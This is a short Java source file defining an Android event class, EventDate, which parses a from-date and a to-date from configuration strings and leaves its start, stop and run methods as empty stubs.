package com.android.service.event;

import java.text.DateFormat;
import java.text.ParseException;
import java.util.Date;

import com.android.service.auto.Cfg;
import com.android.service.conf.ConfEvent;
import com.android.service.conf.ConfigurationException;
import com.android.service.util.Check;

public class EventDate extends BaseTimer {
	private static final String TAG = "EventDate";
	
	private Date dateFrom;
	private Date dateTo;

	@Override
	protected boolean parse(ConfEvent event) {
		try {
			String dateFromString=conf.getString("datefrom");
			String dateToString=conf.getString("dateto");
			
			dateFrom = DateFormat.getDateInstance().parse(dateFromString);
			dateTo = DateFormat.getDateInstance().parse(dateToString);
			
		} catch (ConfigurationException e) {
			return false;
		} catch (ParseException e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (parse) Error: " + e);
			}
			return false;
		}
		return true;
	}

	@Override
	public void actualGo() {
		// TODO Auto-generated method stub

	}

	@Override
	public void actualStart() {
		// TODO Auto-generated method stub

	}

	@Override
	public void actualStop() {
		// TODO Auto-generated method stub

	}

}
